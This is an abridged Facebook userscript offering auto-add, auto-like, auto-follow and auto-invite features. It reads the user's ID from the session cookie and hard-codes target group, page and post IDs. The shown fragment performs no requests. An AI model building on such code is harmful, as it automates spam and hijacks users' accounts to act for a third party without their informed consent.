// ==UserScript==
// @name			** Hot News | Facebook | AutoADD | AutoLike Status | AutoLike Comment | AutoFollow(sub) | AutoInvite | AutoSuggest
...
// @author			Cha (Muhammad Rafizan)
// @authorURL			http://www.facebook.com/cha.dae.woong.sunbae
// @include			htt*://www.facebook.com/*
// @icon			https://www.facebook.com/photo.php?fbid=105610386297508&set=a.105611476297399.1073741829.100005456404469&type=1&relevant_count=1
// @version			6.3.14
...
var gid = ['340781016042438'];
var gid = ['122215971298159'];
...
var spage_id = "454081177997440";
var spost_id = "454081177997440";
var sfoto_id = "454081177997440";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Cha(Muhammad Rafizan)';
